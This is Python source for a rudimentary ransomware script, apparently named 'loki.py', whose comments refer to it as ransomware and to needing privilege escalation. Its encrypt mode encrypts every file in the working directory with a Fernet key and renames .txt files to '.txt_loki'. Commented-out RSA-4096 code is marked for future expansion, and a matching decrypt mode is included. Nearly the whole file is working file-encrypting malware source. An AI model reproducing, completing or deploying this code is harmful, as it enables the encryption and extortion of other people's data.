# Imports.
import base64
import os
import argparse
from pathlib import Path
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# Args.
parser = argparse.ArgumentParser()
ap = parser.add_mutually_exclusive_group()
ap.add_argument('-gen', help='Generate a new key.\n', action="store_true") # Working (Sudo or PrivEsc needed).
ap.add_argument('-encrypt', help='Encrypts files in the ransome directory before moving to the vault.\n', action="store_true") # Working.
ap.add_argument('-decrypt', help='Decrypts files held within the vault.\n', action='store_true') # Working.
args = vars(parser.parse_args())

if args['gen']:
# Lines 20-32 for future expansion utilising RSA-4096 grade encryption already setup below, avoid tamperment if possible.
#       # Keygen - creates the keys.
#       key = RSA.generate(4096)
#       privateKey = key.exportKey()
#       publicKey = key.publickey().exportKey()

#       # Saves the private key.
#       with open('private.pem', 'wb') as f:
#           f.write(privateKey)
#           print("private.pem generated.\n")

#       # Saves the public key.
#       with open('public.pem', 'wb') as f:
#           print("keys generated.\n")

    # Generates a url based fernet key.
        fernkeygen=True
        while fernkeygen:
            print(">_ Generating a key may stop you accessing previously encrypted files, do you want to continue? [Y/n]")
            fernkeygenans=input(">_ ")

            if fernkeygenans=="Y":
                key = Fernet.generate_key()
                with open("fernkey.key", "wb") as thekey:
                    thekey.write(key)
                print("\n(Please avoid losing your key again, if you do run the gen command!)")
                exit()
            elif fernkeygenans=="N":
                print("\n>_ Exiting safely.")
                exit()

if args['encrypt']:
    files = [] # States list.
    for file in os.listdir(): # For files in directory.
        if file == "loki.py" or file == "fernkey.key":
            continue # Ignores the ransome.py, so it won't self encrypt.
        if os.path.isfile(file):
                files.append(file)
    print("\n>_ List of files encrypted:")
    print(files)
    key = Fernet.generate_key()
    with open("fernkey.key", "wb") as thekey:
        thekey.write(key)
    print("\n(Please avoid losing your key, if you do run the gen command!)")

    # Encrypts directory.
    for file in files: # For all the files found.
        with open(file, "rb") as thefile: # Read in binary.
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents) # Encrypts the files read in binary.

        with open(file, "wb") as thefile: # Opens them in write in binary.
            thefile.write(contents_encrypted) # Saves them as encrypted.

        for filename in os.listdir(os.path.dirname(os.path.abspath(__file__))):
            base_file, ext = os.path.splitext(filename)
            if ext == ".txt":
                os.rename(filename, base_file + ".txt_loki")
    print("\n>_ List of files encrypted:")
    print(files)
    exit()

if args['decrypt']:
    # Repeats-lists directory.
    files = [] # States list.
    for file in os.listdir(): # For files in directory.
        if file == "loki.py" or file == "fernkey.key":
            continue # Ignores the ransome.py, so it won't self encrypt.
        if os.path.isfile(file):
                files.append(file)

    with open("fernkey.key", "rb") as key:
        secretkey = key.read()

    # Decrypts directory.
    for file in files: # For all the files found.
        with open(file, "rb") as thefile: # Read in binary.
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents) # Encrypts the files read in binary.
        with open(file, "wb") as thefile: # Opens them in write in binary.
            thefile.write(contents_decrypted) # Saves them as encrypted.

        for filename in os.listdir(os.path.dirname(os.path.abspath(__file__))):
            base_file, ext = os.path.splitext(filename)
            if ext == ".txt_loki":
                os.rename(filename, base_file + ".txt")
    print("\n>_ List of files decrypted:")
    print(files)
    exit()